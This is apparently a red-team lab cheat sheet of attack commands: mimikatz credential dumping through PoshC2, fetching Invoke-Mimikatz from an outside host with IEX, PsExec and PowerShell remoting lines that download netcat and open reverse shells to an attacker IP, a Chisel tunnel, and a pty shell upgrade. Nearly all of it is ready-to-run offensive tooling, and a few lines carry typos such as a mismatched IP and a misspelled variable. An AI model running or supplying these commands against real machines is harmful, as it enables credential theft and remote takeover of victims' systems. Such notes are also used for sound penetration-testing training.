## Tool: PoshC2

### Dumping credentials from a Windows machine

#### Using mimikatz module
- ```mimikatz Command "privilege::debug sekurlsa::logonPasswords"```
- ```mimikatz SamDump```

#### Using safetykatz module
- ```safetykatz full```

#### Using external Invoke-Mimikatz module
- ```sharpps IEX (IWR 'http://hackerdoma.in/Invoke-Mimikatz.ps1' -UseBasicParsing)````
- ```sharpps Invoke-Mimikatz -DumpCreds```
- ```sharpps Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"```

#### Using in-built Invoke-Mimikatz module
- ```pslo Invoke-Mimikatz.ps1```
- ```sharpps Invoke-Mimikatz -DumpCreds```
- ```sharpps Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"```

## Tool: Psexec.exe

To launch a command prompt on a remote machine (using password)

- ``` .\psexec.exe -accepteula -s \\ws01.taxfirstlabz.xyz -u ws01\Administrator -p password cmd.exe ```

To download nc64.exe on a remote machine (using password)

- ``` C:\Users\Public\psexec.exe -accepteula \\ws01.taxfirstlabz.xyz -u ws01\Administrator -p password  powershell.exe -executionpolicy bypass -c wget http://192.168.14.10/nc64.exe -o C:\Users\Public\nc64.exe; ```

To get a reverse shell (using password) (requires nc64.exe to be downloaded on the target machine)

- PowerShell 1: ``` .\psexec.exe -s -accepteula \\ws01.taxfirstlabz.xyz -u ws01\Administrator -p qNkr96DvM03s58ckId8Bi867iuLp4BUNKbOTjFuHMrDu5AtI cmd.exe /c C:\users\Public\nc64.exe 191.168.14.10 8080 -e "powershell.exe -Executionpolicy bypass" ```

- PowerShell 2: ``` C:\Users\Public\psexec.exe -s -accepteula \\ws01.taxfirstlabz.xyz -u ws01\Administrator -p password  powershell.exe -executionpolicy bypass -c C:\Users\Public\nc64.exe 192.168.14.10 8008 -e powershell.exe ```

- Cmd: ``` .\psexec.exe -accepteula \\ws01 -u ws01\Administrator -p password cmd.exe /c C:\users\Public\nc64.exe 192.168.14.10 8080 -e cmd.exe```

## Tool: PSRemote

To download nc64.exe on a remote machine and obtain a reverse shell (using PSCredential object)

```powershell
[string]$userName = 'yaksas'
[string]$userPassword = 'password'

# Convert to SecureString
[securestring]$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
[pscredential]$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)

Invoke-Command -Scriptblock {wget http://192.168.14.10/nc64.exe -o C:\Users\Public\nc64.exe;C:\Users\Public\nc64.exe 192.168.14.10 8081 -e powershell.exe} -computername ws01 -credential $credOjbect
```

## Tool: Chisel

To forward local port 80 

```Start-job -name "chisel" -ScriptBlock {C:\Users\yks\appdata\chisel.exe client 192.168.14.10:8080 R:8008:127.0.0.1:80}```

## Convert to full shell

```python3 -c 'import pty;pty.spawn("/bin/bash")'```

## Start a python3 web server

```python3 -m http.server ```
